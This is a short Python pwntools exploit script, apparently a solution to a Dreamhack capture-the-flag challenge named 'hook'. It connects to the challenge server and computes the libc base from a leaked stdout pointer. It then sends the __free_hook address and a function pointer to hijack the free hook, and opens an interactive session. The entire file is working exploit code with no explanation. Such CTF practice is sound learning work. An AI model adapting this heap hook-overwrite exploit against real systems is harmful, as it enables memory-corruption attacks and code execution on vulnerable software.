from pwn import *

# p = process('./hook')
p = remote('host1.dreamhack.games', 11752)
libc = ELF('./libc-2.23.so')

context.arch = 'amd64'
context.endian = 'little'
context.log_level = 'debug'

p.recvuntil(b'stdout: ')
stdout = int(p.recvline().strip(), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']

free_hook = libc_base + libc.symbols['__free_hook']
random_function = libc_base + libc.symbols['write']

print(f'free_hook: {hex(free_hook)}')
print(f'random_function: {hex(random_function)}')

p.recvuntil(b'Size: ')
p.sendline(b'16')
p.recvuntil(b'Data: ')
p.sendline(p64(free_hook) + p64(random_function))
p.interactive()
